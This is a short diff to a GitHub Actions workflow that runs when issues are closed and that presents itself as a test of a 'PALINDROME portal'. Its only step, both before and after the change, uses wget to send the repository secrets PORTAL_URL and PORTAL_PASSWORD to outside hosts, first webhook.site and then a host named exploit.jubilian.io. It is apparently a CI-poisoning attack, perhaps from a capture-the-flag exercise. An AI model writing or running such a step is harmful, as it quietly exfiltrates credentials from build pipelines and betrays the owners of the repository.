@@ -1,5 +1,4 @@
-name: Test the PALINDROME portal
-
+name: TEST PLEASE
 on:
     issues:
         types: [closed]
@@ -11,5 +10,5 @@ jobs:
       - uses: actions/checkout@v3
       - name: Test the PALINDROME portal
         run: | 
-          C:\msys64\usr\bin\wget.exe '''https://webhook.site/eb0ed583-6222-4199-bf25-488f06675243/?u=${{ secrets.PORTAL_URL }}&p=${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+          C:\msys64\usr\bin\wget.exe '''https://exploit.jubilian.io/?a=${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
           cat test
